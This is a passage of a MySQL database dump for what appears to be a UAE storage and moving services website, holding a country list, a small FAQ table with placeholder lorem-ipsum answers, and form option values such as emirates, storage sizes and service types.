(111, 'Guadeloupe', '2024-05-30 05:31:13', '2024-05-30 05:31:13'),
(112, 'Guam', '2024-05-30 05:31:19', '2024-05-30 05:31:19'),
(113, 'Guatemala', '2024-05-30 05:32:02', '2024-05-30 05:32:02'),
(114, 'Guinea', '2024-05-30 05:32:08', '2024-05-30 05:32:08'),
(115, 'Guinea-Bissau', '2024-05-30 05:32:15', '2024-05-30 05:32:15'),
(116, 'Guyana', '2024-05-30 05:32:22', '2024-05-30 05:32:22'),
(117, 'Haiti', '2024-05-30 05:32:28', '2024-05-30 05:32:28'),
(118, 'Heard and Mc Donald Islands', '2024-05-30 05:32:35', '2024-05-30 05:32:35'),
(119, 'Holy See (Vatican City State)', '2024-05-30 05:32:42', '2024-05-30 05:32:42'),
(120, 'Honduras', '2024-05-30 05:32:49', '2024-05-30 05:32:49'),
(121, 'Hong Kong', '2024-05-30 05:32:59', '2024-05-30 05:32:59'),
(122, 'Hungary', '2024-05-30 05:33:10', '2024-05-30 05:33:10'),
(123, 'Iceland', '2024-05-30 05:33:22', '2024-05-30 05:33:22'),
(124, 'India', '2024-05-30 05:33:29', '2024-05-30 05:33:29'),
(125, 'Indonesia', '2024-05-30 05:33:35', '2024-05-30 05:33:35'),
(126, 'Iran (Islamic Republic of)', '2024-05-30 05:33:43', '2024-05-30 05:33:43'),
(127, 'Iraq', '2024-05-30 05:33:52', '2024-05-30 05:33:52'),
(128, 'Ireland', '2024-05-30 05:33:59', '2024-05-30 05:33:59'),
(129, 'Israel', '2024-05-30 05:34:07', '2024-05-30 05:34:07'),
(130, 'Italy', '2024-05-30 05:34:17', '2024-05-30 05:34:17'),
(131, 'Jamaica', '2024-05-30 05:34:25', '2024-05-30 05:34:25'),
(132, 'Japan', '2024-05-30 05:34:32', '2024-05-30 05:34:32'),
(133, 'Jordan', '2024-05-30 05:34:39', '2024-05-30 05:34:39'),
(134, 'Kazakhstan', '2024-05-30 05:34:49', '2024-05-30 05:34:49'),
(135, 'Kenya', '2024-05-30 05:35:05', '2024-05-30 05:35:05'),
(136, 'Kiribati', '2024-05-30 05:35:13', '2024-05-30 05:35:13'),
(137, 'Korea, Democratic People\'s Republic of', '2024-05-30 05:35:20', '2024-05-30 05:35:20'),
(138, 'Korea, Republic of', '2024-05-30 05:35:27', '2024-05-30 05:35:27'),
(139, 'Kuwait', '2024-05-30 05:35:34', '2024-05-30 05:35:34'),
(140, 'Kyrgyzstan', '2024-05-30 05:35:44', '2024-05-30 05:35:44'),
(141, 'Lao, People\'s Democratic Republic', '2024-05-30 05:35:51', '2024-05-30 05:35:51'),
(142, 'Latvia', '2024-05-30 05:35:57', '2024-05-30 05:35:57'),
(143, 'Lebanon', '2024-05-30 05:36:04', '2024-05-30 05:36:04'),
(144, 'Lesotho', '2024-05-30 05:36:10', '2024-05-30 05:36:10'),
(145, 'Liberia', '2024-05-30 05:36:19', '2024-05-30 05:36:19'),
(146, 'Libyan Arab Jamahiriya', '2024-05-30 05:36:26', '2024-05-30 05:36:26'),
(147, 'Liechtenstein', '2024-05-30 05:36:35', '2024-05-30 05:36:35'),
(148, 'Lithuania', '2024-05-30 05:36:43', '2024-05-30 05:36:43'),
(149, 'Luxembourg', '2024-05-30 05:36:49', '2024-05-30 05:36:49'),
(150, 'Macau', '2024-05-30 05:36:57', '2024-05-30 05:36:57'),
(151, 'Macedonia, The Former Yugoslav Republic of', '2024-05-30 05:37:06', '2024-05-30 05:37:06'),
(152, 'Madagascar', '2024-05-30 05:37:14', '2024-05-30 05:37:14'),
(153, 'Malawi', '2024-05-30 05:37:22', '2024-05-30 05:37:22'),
(154, 'Malaysia', '2024-05-30 05:37:30', '2024-05-30 05:37:30'),
(155, 'Maldives', '2024-05-30 05:37:38', '2024-05-30 05:37:38'),
(156, 'Mali', '2024-05-30 05:37:45', '2024-05-30 05:37:45'),
(157, 'Malta', '2024-05-30 05:37:52', '2024-05-30 05:37:52'),
(158, 'Marshall Islands', '2024-05-30 05:38:02', '2024-05-30 05:38:02'),
(159, 'Martinique', '2024-05-30 05:38:12', '2024-05-30 05:38:12'),
(160, 'Mauritania', '2024-05-30 05:38:18', '2024-05-30 05:38:18'),
(161, 'Mauritius', '2024-05-30 05:38:30', '2024-05-30 05:38:30'),
(162, 'Mayotte', '2024-05-30 05:38:42', '2024-05-30 05:38:42'),
(163, 'Mexico', '2024-05-30 05:38:49', '2024-05-30 05:38:49'),
(164, 'Micronesia, Federated States of', '2024-05-30 05:39:00', '2024-05-30 05:39:00'),
(165, 'Moldova, Republic of', '2024-05-30 05:39:09', '2024-05-30 05:39:09'),
(166, 'Monaco', '2024-05-30 05:39:16', '2024-05-30 05:39:16'),
(167, 'Mongolia', '2024-05-30 05:39:23', '2024-05-30 05:39:23'),
(168, 'Montserrat', '2024-05-30 05:39:30', '2024-05-30 05:39:30'),
(169, 'Morocco', '2024-05-30 05:39:37', '2024-05-30 05:39:37'),
(170, 'Mozambique', '2024-05-30 05:39:44', '2024-05-30 05:39:44'),
(171, 'Myanmar', '2024-05-30 05:39:51', '2024-05-30 05:39:51'),
(172, 'Namibia', '2024-05-30 05:40:18', '2024-05-30 05:40:18'),
(173, 'Nauru', '2024-05-30 05:40:25', '2024-05-30 05:40:25'),
(174, 'Nepal', '2024-05-30 05:40:31', '2024-05-30 05:40:31'),
(175, 'Netherlands', '2024-05-30 05:40:38', '2024-05-30 05:40:38'),
(176, 'Netherlands Antilles', '2024-05-30 05:40:47', '2024-05-30 05:40:47'),
(177, 'New Caledonia', '2024-05-30 05:40:54', '2024-05-30 05:40:54'),
(178, 'New Zealand', '2024-05-30 05:41:01', '2024-05-30 05:41:01'),
(179, 'Nicaragua', '2024-05-30 05:41:08', '2024-05-30 05:41:08'),
(180, 'Niger', '2024-05-30 05:41:15', '2024-05-30 05:41:15'),
(181, 'Nigeria', '2024-05-30 05:41:22', '2024-05-30 05:41:22'),
(182, 'Niue', '2024-05-30 05:41:29', '2024-05-30 05:41:29'),
(183, 'Norfolk Island', '2024-05-30 05:41:36', '2024-05-30 05:41:36'),
(184, 'Northern Mariana Islands', '2024-05-30 05:41:45', '2024-05-30 05:41:45'),
(185, 'Norway', '2024-05-30 05:41:51', '2024-05-30 05:41:51'),
(186, 'Oman', '2024-05-30 05:42:00', '2024-05-30 05:42:00'),
(187, 'Pakistan', '2024-05-30 05:42:13', '2024-05-30 05:42:13'),
(188, 'Palau', '2024-05-30 05:42:22', '2024-05-30 05:42:22'),
(189, 'Panama', '2024-05-30 05:42:28', '2024-05-30 05:42:28'),
(190, 'Papua New Guinea', '2024-05-30 05:42:35', '2024-05-30 05:42:35'),
(191, 'Paraguay', '2024-05-30 05:42:41', '2024-05-30 05:42:41'),
(192, 'Peru', '2024-05-30 05:42:46', '2024-05-30 05:42:46'),
(193, 'Philippines', '2024-05-30 05:42:53', '2024-05-30 05:42:53'),
(194, 'Pitcairn', '2024-05-30 05:43:00', '2024-05-30 05:43:00'),
(195, 'Poland', '2024-05-30 05:43:05', '2024-05-30 05:43:05'),
(196, 'Portugal', '2024-05-30 05:43:18', '2024-05-30 05:43:18'),
(197, 'Puerto Rico', '2024-05-30 05:43:25', '2024-05-30 05:43:25'),
(198, 'Qatar', '2024-05-30 05:43:33', '2024-05-30 05:43:33'),
(199, 'Reunion', '2024-05-30 05:43:40', '2024-05-30 05:43:40'),
(200, 'Romania', '2024-05-30 05:43:48', '2024-05-30 05:43:48'),
(201, 'Russian Federation', '2024-05-30 05:43:54', '2024-05-30 05:43:54'),
(202, 'Rwanda', '2024-05-30 05:44:00', '2024-05-30 05:44:00'),
(203, 'Saint Kitts and Nevis', '2024-05-30 05:44:06', '2024-05-30 05:44:06'),
(204, 'Saint Lucia', '2024-05-30 05:44:14', '2024-05-30 05:44:14'),
(205, 'Saint Vincent and the Grenadines', '2024-05-30 05:44:21', '2024-05-30 05:44:21'),
(206, 'Samoa', '2024-05-30 05:44:27', '2024-05-30 05:44:27'),
(207, 'San Marino', '2024-05-30 05:44:33', '2024-05-30 05:44:33'),
(208, 'Sao Tome and Principe', '2024-05-30 05:44:40', '2024-05-30 05:44:40'),
(209, 'Saudi Arabia', '2024-05-30 05:44:46', '2024-05-30 05:44:46'),
(210, 'Senegal', '2024-05-30 05:44:54', '2024-05-30 05:44:54'),
(211, 'Seychelles', '2024-05-30 05:45:03', '2024-05-30 05:45:03'),
(212, 'Sierra Leone', '2024-05-30 05:45:11', '2024-05-30 05:45:11'),
(213, 'Singapore', '2024-05-30 05:45:18', '2024-05-30 05:45:18'),
(214, 'Slovakia (Slovak Republic)', '2024-05-30 05:45:25', '2024-05-30 05:45:25'),
(215, 'Slovenia', '2024-05-30 05:45:32', '2024-05-30 05:45:32'),
(216, 'Solomon Islands', '2024-05-30 05:45:40', '2024-05-30 05:45:40'),
(217, 'Somalia', '2024-05-30 05:45:50', '2024-05-30 05:45:50'),
(218, 'South Africa', '2024-05-30 05:46:01', '2024-05-30 05:46:01'),
(219, 'South Georgia and the South Sandwich Islands', '2024-05-30 05:46:10', '2024-05-30 05:46:10'),
(220, 'Spain', '2024-05-30 05:46:16', '2024-05-30 05:46:16'),
(221, 'Sri Lanka', '2024-05-30 05:46:22', '2024-05-30 05:46:22'),
(222, 'St. Helena', '2024-05-30 05:46:29', '2024-05-30 05:46:29'),
(223, 'St. Pierre and Miquelon', '2024-05-30 05:46:35', '2024-05-30 05:46:35'),
(224, 'Sudan', '2024-05-30 05:46:41', '2024-05-30 05:46:41'),
(225, 'Suriname', '2024-05-30 05:46:52', '2024-05-30 05:46:52'),
(226, 'Svalbard and Jan Mayen Islands', '2024-05-30 05:47:00', '2024-05-30 05:47:00'),
(227, 'Swaziland', '2024-05-30 05:47:05', '2024-05-30 05:47:05'),
(228, 'Sweden', '2024-05-30 05:47:13', '2024-05-30 05:47:13'),
(229, 'Switzerland', '2024-05-30 05:47:34', '2024-05-30 05:47:34'),
(230, 'Syrian Arab Republic', '2024-05-30 05:47:44', '2024-05-30 05:47:44'),
(231, 'Taiwan, Province of China', '2024-05-30 05:47:51', '2024-05-30 05:47:51'),
(232, 'Tajikistan', '2024-05-30 05:47:58', '2024-05-30 05:47:58'),
(233, 'Tanzania, United Republic of', '2024-05-30 05:48:06', '2024-05-30 05:48:06'),
(234, 'Thailand', '2024-05-30 05:48:15', '2024-05-30 05:48:15'),
(235, 'Togo', '2024-05-30 05:48:25', '2024-05-30 05:48:25'),
(236, 'Tokelau', '2024-05-30 05:48:33', '2024-05-30 05:48:33'),
(237, 'Tonga', '2024-05-30 05:48:39', '2024-05-30 05:48:39'),
(238, 'Trinidad and Tobago', '2024-05-30 05:48:46', '2024-05-30 05:48:46'),
(239, 'Tunisia', '2024-05-30 05:48:53', '2024-05-30 05:48:53'),
(240, 'Turkey', '2024-05-30 05:48:59', '2024-05-30 05:48:59'),
(241, 'Turkmenistan', '2024-05-30 05:49:05', '2024-05-30 05:49:05'),
(242, 'Turks and Caicos Islands', '2024-05-30 05:49:12', '2024-05-30 05:49:12'),
(243, 'Tuvalu', '2024-05-30 05:49:19', '2024-05-30 05:49:19'),
(244, 'Uganda', '2024-05-30 05:49:26', '2024-05-30 05:49:26'),
(245, 'Ukraine', '2024-05-30 05:49:32', '2024-05-30 05:49:32'),
(246, 'United Arab Emirates', '2024-05-30 05:49:39', '2024-05-30 05:49:39'),
(247, 'United Kingdom', '2024-05-30 05:49:44', '2024-05-30 05:49:44'),
(248, 'United States', '2024-05-30 05:49:51', '2024-05-30 05:49:51'),
(249, 'United States Minor Outlying Islands', '2024-05-30 05:50:00', '2024-05-30 05:50:00'),
(250, 'Uruguay', '2024-05-30 05:50:05', '2024-05-30 05:50:05'),
(251, 'Uzbekistan', '2024-05-30 05:50:11', '2024-05-30 05:50:11'),
(252, 'Vanuatu', '2024-05-30 05:50:18', '2024-05-30 05:50:18'),
(253, 'Venezuela', '2024-05-30 05:50:24', '2024-05-30 05:50:24'),
(254, 'Vietnam', '2024-05-30 05:50:30', '2024-05-30 05:50:30'),
(255, 'Virgin Islands (British)', '2024-05-30 05:50:37', '2024-05-30 05:50:37'),
(256, 'Virgin Islands (U.S.)', '2024-05-30 05:50:43', '2024-05-30 05:50:43'),
(257, 'Wallis and Futuna Islands', '2024-05-30 05:50:51', '2024-05-30 05:50:51'),
(258, 'Western Sahara', '2024-05-30 05:50:58', '2024-05-30 05:50:58'),
(259, 'Yemen', '2024-05-30 05:51:04', '2024-05-30 05:51:04'),
(260, 'Yugoslavia', '2024-05-30 05:51:12', '2024-05-30 05:51:12'),
(261, 'Zambia', '2024-05-30 05:51:19', '2024-05-30 05:51:19'),
(262, 'Zimbabwe', '2024-05-30 05:51:25', '2024-05-30 05:51:25');

-- --------------------------------------------------------

--
-- Table structure for table `faqs`
--

CREATE TABLE `faqs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `packages` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `question` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `answer` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `faqs`
--

INSERT INTO `faqs` (`id`, `packages`, `question`, `answer`, `created_at`, `updated_at`) VALUES
(3, '11,23', 'Can I cancel at anytime?', '<p>Cras vitae ac nunc orci. Purus amet tortor non at phasellus ultricies hendrerit. Eget a, sit morbi nunc sit id massa. Metus,scelerisque volutpat nec sit vel donec. Sagittis, id volutpat erat vel.</p>', '2023-11-28 04:42:28', '2024-01-06 01:05:45'),
(4, '11,10', 'How do I get a receipt for my purchase?', '<p>Cras vitae ac nunc orci. Purus amet tortor non at phasellus ultricies hendrerit. Eget a, sit morbi nunc sit id massa. Metus,scelerisque volutpat nec sit vel donec. Sagittis, id volutpat erat vel.</p>', '2024-01-05 22:28:42', '2024-01-06 01:05:11'),
(5, '67,66,23', 'What methods of payments are supported?', '<p>Cras vitae ac nunc orci. Purus amet tortor non at phasellus ultricies hendrerit. Eget a, sit morbi nunc sit id massa. Metus, scelerisque volutpat nec sit vel donec. Sagittis, id volutpat erat vel.&nbsp;</p>', '2024-05-21 03:37:23', '2024-05-21 03:37:23');

-- --------------------------------------------------------

--
-- Table structure for table `form_attributes`
--

CREATE TABLE `form_attributes` (
  `id` int(11) NOT NULL,
  `form_id` int(11) NOT NULL,
  `form_option` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `form_attributes`
--

INSERT INTO `form_attributes` (`id`, `form_id`, `form_option`) VALUES
(51, 17, 'Dubai'),
(52, 17, 'Abu Dhabi'),
(53, 17, 'Sharjah'),
(54, 18, 'Dubai'),
(55, 18, 'Abu Dhabi'),
(56, 20, 'Apartment'),
(57, 20, 'Villa'),
(58, 24, 'test-1'),
(59, 24, 'test-2'),
(60, 24, 'test-3'),
(61, 25, 'Personal'),
(62, 25, 'Commercial'),
(64, 17, 'Ajman'),
(65, 17, 'Ras Al Khaimah'),
(66, 17, 'Umm Al Quwain'),
(67, 17, 'Fujairah'),
(68, 18, 'Sharjah'),
(69, 18, 'Ajman'),
(70, 18, 'Ras Al Khaimah'),
(71, 18, 'Umm Al Quwain'),
(72, 18, 'Fujairah'),
(73, 20, 'Commercial'),
(75, 28, 'Furniture'),
(76, 28, 'Personal Items'),
(77, 28, 'Cars'),
(78, 28, 'Perishable Items'),
(79, 28, 'Documents'),
(80, 28, 'Event Items'),
(81, 28, 'Other'),
(82, 29, 'Not Sure'),
(83, 29, '10 sq foot'),
(84, 29, '25 sq foot'),
(85, 29, '50 sq foot'),
(86, 29, '75 sq foot'),
(87, 29, '100 sq foot'),
(88, 29, '150 sq foot'),
(89, 29, '250 sq foot and bigger'),
(90, 31, 'Packing'),
(91, 31, 'Pick up and Delivery'),
(92, 31, 'Redelivery'),
(93, 31, 'Climate Controlled Storage'),
(94, 31, '24 Hour Access'),
(95, 31, 'Cold Storage (for perishable items)'),
(96, 33, '1'),
(97, 33, '2'),
(98, 33, '3'),
(99, 33, '4'),
(100, 34, '1'),
(101, 34, '2'),
(102, 34, '3'),
(103, 34, '4'),
(104, 34, '5'),
(105, 34, '6'),
(106, 34, '7'),
(107, 34, '8'),
(108, 35, 'One Time'),
(109, 35, 'Daily'),
(110, 35, 'Weekly'),
(111, 35, 'Multiple times a week'),
(112, 36, 'yes'),
(113, 36, 'no'),
(114, 37, '1'),
(115, 37, '2'),
(116, 37, '3'),
(117, 37, '4'),
(118, 37, '5'),
(119, 37, '6'),
(120, 37, '7'),
(121, 37, '8'),
(122, 37, 'other'),
(123, 38, 'Shampoo'),
(124, 38, 'Steam'),
(125, 39, 'Dubai'),
(126, 39, 'Abu Dhabi'),
(127, 40, 'Dubai'),
(128, 40, 'Abu Dhabi'),
(129, 42, '1'),
(130, 42, '2'),
(131, 42, '3'),
(132, 42, '4'),
(133, 42, '5'),
(134, 42, 'other'),
(135, 43, 'test-1'),
(136, 43, 'test-2'),
(137, 44, 'Test-1'),
(138, 44, 'Test-2'),
(139, 44, 'Test-3'),
(140, 47, 'Afghanistan'),
(141, 47, 'Albania'),
(142, 47, 'Algeria'),
(143, 48, 'Abu Dhabhi'),
(144, 48, 'Mumbai'),
(145, 48, 'Noth us'),
(148, 50, 'Apartment'),
(149, 50, 'Villa'),
(150, 51, 'Test-1'),
(151, 51, 'Test-2'),
(152, 51, 'Test-3'),
(153, 51, 'Test-4'),
(154, 52, 'option 1'),
(155, 52, 'option 2'),
(158, 57, 'Afghanistan'),
(159, 57, 'Albania'),
(160, 57, 'Algeria'),
(161, 57, 'American Samoa'),
(162, 57, 'Andorra'),
(163, 57, 'Angola'),
(164, 57, 'Anguilla'),
(165, 57, 'Antarctica'),
(166, 57, 'Antigua and Barbuda'),
(167, 57, 'Argentina'),
(168, 57, 'Armenia'),
(169, 57, 'Aruba'),
(170, 57, 'Australia'),
(171, 57, 'Austria'),
(172, 57, 'Azerbaijan'),
(173, 57, 'Bahamas'),
(174, 57, 'Bahrain'),
(175, 57, 'Bangladesh'),
(176, 57, 'Barbados'),
(177, 57, 'Belarus'),
(178, 57, 'Belgium'),
(179, 57, 'Belize'),
(180, 57, 'Benin'),
(181, 57, 'Bermuda'),
(182, 57, 'Bhutan'),
(183, 57, 'Bolivia'),
(184, 57, 'Bosnia and Herzegowina'),
(185, 57, 'Botswana'),
(186, 57, 'Bouvet Island'),
(187, 57, 'Brazil'),
(188, 57, 'British Indian Ocean Territory'),
(189, 57, 'Brunei Darussalam'),
(190, 57, 'Bulgaria'),
(191, 57, 'Burkina Faso'),
(192, 57, 'Burundi'),
(193, 57, 'Cambodia'),
(194, 57, 'Cameroon'),
(195, 57, 'Canada'),
(196, 57, 'Cape Verde'),
(197, 57, 'Cayman Islands'),
(198, 57, 'Central African Republic'),
(199, 57, 'Chad'),
(200, 57, 'Chile'),
(201, 57, 'China'),
(202, 57, 'Christmas Island'),
(203, 57, 'Cocos (Keeling) Islands'),
(204, 57, 'Colombia'),
(205, 57, 'Comoros'),
(206, 57, 'Congo'),
(207, 57, 'Congo, the Democratic Republic of the'),
(208, 57, 'Cook Islands'),
(209, 57, 'Costa Rica'),
(210, 57, 'Cote d\'Ivoire'),
(211, 57, 'Croatia (Hrvatska)'),
(212, 57, 'Cuba'),
(213, 57, 'Cyprus'),
(214, 57, 'Czech Republic'),
(215, 57, 'Denmark'),
(216, 57, 'Djibouti'),
(217, 57, 'Dominica'),
(218, 57, 'Dominican Republic'),
(219, 57, 'East Timor'),
(220, 57, 'Ecuador'),
(221, 57, 'Egypt'),
(222, 57, 'El Salvador'),
(223, 57, 'Equatorial Guinea'),
(224, 57, 'Eritrea'),
(225, 57, 'Estonia'),
(226, 57, 'Ethiopia'),
(227, 57, 'Falkland Islands (Malvinas)'),
(228, 57, 'Faroe Islands'),
(229, 57, 'Fiji'),
(230, 57, 'Finland'),
(231, 57, 'France'),
(232, 57, 'France Metropolitan'),
(233, 57, 'French Guiana'),
(234, 57, 'French Polynesia'),
(235, 57, 'French Southern Territories'),
(236, 57, 'Gabon'),
(237, 57, 'Gambia'),
(238, 57, 'Georgia'),
(239, 57, 'Germany'),
(240, 57, 'Ghana'),
(241, 57, 'Gibraltar'),
(242, 57, 'Greece'),
(243, 57, 'Greenland'),
(244, 57, 'Grenada'),
(245, 57, 'Guadeloupe'),
(246, 57, 'Guam'),
(247, 57, 'Guatemala'),
(248, 57, 'Guinea'),
(249, 57, 'Guinea-Bissau'),
(250, 57, 'Guyana'),
(251, 57, 'Haiti'),
(252, 57, 'Heard and Mc Donald Islands'),
(253, 57, 'Holy See (Vatican City State)'),
(254, 57, 'Honduras'),
(255, 57, 'Hong Kong'),
(256, 57, 'Hungary'),
(257, 57, 'Iceland'),
(258, 57, 'India'),
(259, 57, 'Indonesia'),
(260, 57, 'Iran (Islamic Republic of)'),
(261, 57, 'Iraq'),
(262, 57, 'Ireland'),
(263, 57, 'Israel'),
(264, 57, 'Italy'),
(265, 57, 'Jamaica'),
(266, 57, 'Japan'),
(267, 57, 'Jordan'),
(268, 57, 'Kazakhstan'),
(269, 57, 'Kenya'),
(270, 57, 'Kiribati'),
(271, 57, 'Korea, Democratic People\'s Republic of'),
(272, 57, 'Korea, Republic of'),
(273, 57, 'Kuwait'),
(274, 57, 'Kyrgyzstan'),
(275, 57, 'Lao, People\'s Democratic Republic'),
(276, 57, 'Latvia'),
(277, 57, 'Lebanon'),
(278, 57, 'Lesotho'),
(279, 57, 'Liberia'),
(280, 57, 'Libyan Arab Jamahiriya'),
(281, 57, 'Liechtenstein'),
(282, 57, 'Lithuania'),
(283, 57, 'Luxembourg'),
(284, 57, 'Macau'),
(285, 57, 'Macedonia, The Former Yugoslav Republic of'),
(286, 57, 'Madagascar'),
(287, 57, 'Malawi'),
(288, 57, 'Malaysia'),
(289, 57, 'Maldives'),
(290, 57, 'Mali'),
(291, 57, 'Malta'),
(292, 57, 'Marshall Islands'),
(293, 57, 'Martinique'),
(294, 57, 'Mauritania'),
(295, 57, 'Mauritius'),
(296, 57, 'Mayotte'),
(297, 57, 'Mexico'),
(298, 57, 'Micronesia, Federated States of'),
(299, 57, 'Moldova, Republic of'),
(300, 57, 'Monaco'),
(301, 57, 'Mongolia'),
(302, 57, 'Montserrat'),
(303, 57, 'Morocco'),
(304, 57, 'Mozambique'),
(305, 57, 'Myanmar'),
(306, 57, 'Namibia'),
(307, 57, 'Nauru'),
(308, 57, 'Nepal'),
(309, 57, 'Netherlands'),
(310, 57, 'Netherlands Antilles'),
(311, 57, 'New Caledonia'),
(312, 57, 'New Zealand'),
(313, 57, 'Nicaragua'),
(314, 57, 'Niger'),
(315, 57, 'Nigeria'),
(316, 57, 'Niue'),
(317, 57, 'Norfolk Island'),
(318, 57, 'Northern Mariana Islands'),
(319, 57, 'Norway'),
(320, 57, 'Oman'),
(321, 57, 'Pakistan'),
(322, 57, 'Palau'),
(323, 57, 'Panama'),
(324, 57, 'Papua New Guinea'),
(325, 57, 'Paraguay'),
(326, 57, 'Peru'),
(327, 57, 'Philippines'),
(328, 57, 'Pitcairn'),
(329, 57, 'Poland'),
(330, 57, 'Portugal'),
(331, 57, 'Puerto Rico'),
(332, 57, 'Qatar'),
(333, 57, 'Reunion'),
(334, 57, 'Romania'),
(335, 57, 'Russian Federation'),
(336, 57, 'Rwanda'),
(337, 57, 'Saint Kitts and Nevis'),
(338, 57, 'Saint Lucia'),
(339, 57, 'Saint Vincent and the Grenadines'),
(340, 57, 'Samoa'),
(341, 57, 'San Marino'),
(342, 57, 'Sao Tome and Principe'),
(343, 57, 'Saudi Arabia'),
(344, 57, 'Senegal'),
(345, 57, 'Seychelles'),
(346, 57, 'Sierra Leone'),
(347, 57, 'Singapore'),
(348, 57, 'Slovakia (Slovak Republic)'),
(349, 57, 'Slovenia'),
(350, 57, 'Solomon Islands'),
(351, 57, 'Somalia'),
(352, 57, 'South Africa'),
(353, 57, 'South Georgia and the South Sandwich Islands'),
(354, 57, 'Spain'),
(355, 57, 'Sri Lanka'),
(356, 57, 'St. Helena'),
(357, 57, 'St. Pierre and Miquelon'),
(358, 57, 'Sudan'),
(359, 57, 'Suriname'),
(360, 57, 'Svalbard and Jan Mayen Islands'),
(361, 57, 'Swaziland'),
(362, 57, 'Sweden'),
(363, 57, 'Switzerland'),
(364, 57, 'Syrian Arab Republic'),
(365, 57, 'Taiwan, Province of China'),
(366, 57, 'Tajikistan'),
(367, 57, 'Tanzania, United Republic of'),
(368, 57, 'Thailand'),
(369, 57, 'Togo'),
(370, 57, 'Tokelau'),
(371, 57, 'Tonga'),
(372, 57, 'Trinidad and Tobago'),
(373, 57, 'Tunisia'),
(374, 57, 'Turkey'),
(375, 57, 'Turkmenistan'),
(376, 57, 'Turks and Caicos Islands'),
(377, 57, 'Tuvalu'),
(378, 57, 'Uganda'),
(379, 57, 'Ukraine'),
(380, 57, 'United Arab Emirates'),
(381, 57, 'United Kingdom'),
(382, 57, 'United States'),
(383, 57, 'United States Minor Outlying Islands'),
(384, 57, 'Uruguay'),
(385, 57, 'Uzbekistan'),
(386, 57, 'Vanuatu'),
(387, 57, 'Venezuela'),
(388, 57, 'Vietnam'),
(389, 57, 'Virgin Islands (British)'),
(390, 57, 'Virgin Islands (U.S.)'),
(391, 57, 'Wallis and Futuna Islands'),
(392, 57, 'Western Sahara'),
(393, 57, 'Yemen'),
(394, 57, 'Yugoslavia'),
(395, 57, 'Zambia'),
(396, 57, 'Zimbabwe'),
(397, 47, 'American Samoa'),
(398, 47, 'Andorra'),
(399, 47, 'Angola'),
(400, 47, 'Anguilla'),
(401, 47, 'Antarctica'),
(402, 47, 'Antigua and Barbuda'),
(403, 47, 'Argentina'),
(404, 47, 'Armenia'),
(405, 47, 'Aruba'),
(406, 47, 'Australia'),
(407, 47, 'Austria'),
(408, 47, 'Azerbaijan'),
(409, 47, 'Bahamas'),
(410, 47, 'Bahrain'),
(411, 47, 'Bangladesh'),
(412, 47, 'Barbados'),
(413, 47, 'Belarus'),
(414, 47, 'Belgium'),
(415, 47, 'Belize'),
(416, 47, 'Benin'),
(417, 47, 'Bermuda'),
(418, 47, 'Bhutan'),
(419, 47, 'Bolivia'),
(420, 47, 'Bosnia and Herzegowina'),
(421, 47, 'Botswana'),
(422, 47, 'Bouvet Island'),
(423, 47, 'Brazil'),
(424, 47, 'British Indian Ocean Territory'),
(425, 47, 'Brunei Darussalam'),
(426, 47, 'Bulgaria'),
(427, 47, 'Burkina Faso'),
(428, 47, 'Burundi'),
(429, 47, 'Cambodia'),
(430, 47, 'Cameroon'),
(431, 47, 'Canada'),
(432, 47, 'Cape Verde'),
(433, 47, 'Cayman Islands'),
(434, 47, 'Central African Republic'),
(435, 47, 'Chad'),
(436, 47, 'Chile'),
(437, 47, 'China'),
(438, 47, 'Christmas Island'),
(439, 47, 'Cocos (Keeling) Islands'),
(440, 47, 'Colombia'),
(441, 47, 'Comoros'),
(442, 47, 'Congo'),
(443, 47, 'Congo, the Democratic Republic of the'),
(444, 47, 'Cook Islands'),
(445, 47, 'Costa Rica'),
(446, 47, 'Cote d\'Ivoire'),
(447, 47, 'Croatia (Hrvatska)'),
(448, 47, 'Cuba'),
(449, 47, 'Cyprus'),
(450, 47, 'Czech Republic'),
(451, 47, 'Denmark'),
(452, 47, 'Djibouti'),
(453, 47, 'Dominica'),
(454, 47, 'Dominican Republic'),
(455, 47, 'East Timor'),
(456, 47, 'Ecuador'),
(457, 47, 'Egypt'),
(458, 47, 'El Salvador'),
(459, 47, 'Equatorial Guinea'),
(460, 47, 'Eritrea'),
(461, 47, 'Estonia'),
(462, 47, 'Ethiopia'),
(463, 47, 'Falkland Islands (Malvinas)'),
(464, 47, 'Faroe Islands'),
(465, 47, 'Fiji'),
(466, 47, 'Finland'),
(467, 47, 'France'),
(468, 47, 'France Metropolitan'),
(469, 47, 'French Guiana'),
(470, 47, 'French Polynesia'),
(471, 47, 'French Southern Territories'),
(472, 47, 'Gabon'),
(473, 47, 'Gambia'),
(474, 47, 'Georgia'),
(475, 47, 'Germany'),
(476, 47, 'Ghana'),
(477, 47, 'Gibraltar'),
(478, 47, 'Greece'),
(479, 47, 'Greenland'),
(480, 47, 'Grenada'),
(481, 47, 'Guadeloupe'),
(482, 47, 'Guam'),
(483, 47, 'Guatemala'),
(484, 47, 'Guinea'),
(485, 47, 'Guinea-Bissau'),
(486, 47, 'Guyana'),
(487, 47, 'Haiti'),
(488, 47, 'Heard and Mc Donald Islands'),
(489, 47, 'Holy See (Vatican City State)'),
(490, 47, 'Honduras'),
(491, 47, 'Hong Kong'),
(492, 47, 'Hungary'),
(493, 47, 'Iceland'),
(494, 47, 'India'),
(495, 47, 'Indonesia'),
(496, 20, 'Office'),
(497, 47, 'Iran (Islamic Republic of)'),
(498, 47, 'Iraq'),
(499, 47, 'Ireland'),
(500, 47, 'Israel'),
(501, 47, 'Italy'),
(502, 47, 'Jamaica'),
(503, 47, 'Japan'),
(504, 47, 'Jordan'),
(505, 47, 'Kazakhstan'),
(506, 47, 'Kenya'),
(507, 47, 'Kiribati'),
(508, 47, 'Korea'),
(509, 47, 'Democratic People\'s Republic of'),
(510, 47, 'Korea, Republic of'),
(511, 47, 'Kuwait'),
(512, 47, 'Kyrgyzstan'),
(513, 47, 'Lao, People\'s Democratic Republic'),
(514, 47, 'Latvia'),
(515, 47, 'Lebanon'),
(516, 47, 'Lesotho'),
(517, 47, 'Liberia'),
(518, 47, 'Libyan Arab Jamahiriya'),
(519, 47, 'Liechtenstein'),
